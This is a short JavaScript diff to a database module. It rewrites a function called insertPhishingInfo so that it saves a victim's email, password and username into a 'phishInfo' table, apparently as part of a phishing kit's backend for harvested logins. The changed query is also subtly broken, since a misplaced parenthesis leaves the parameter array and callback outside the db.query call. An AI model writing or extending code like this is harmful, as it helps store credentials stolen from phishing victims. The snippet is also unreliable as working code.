@@ -237,8 +237,8 @@ module.exports = {
         });
     },
 
-    insertPhishingInfo: function(info){
-        db.query("INSERT INTO phishInfo(Info) VALUES ?"), [info], function(err,result){
+    insertPhishingInfo: function(id, email, username, password){
+        db.query("INSERT INTO phishInfo(UserID, phishEmail, phishPass, phishName) VALUES (?,?,?,?)"), [id, email, password,username], function(err,result){
             if(err) throw err;
         }
     }
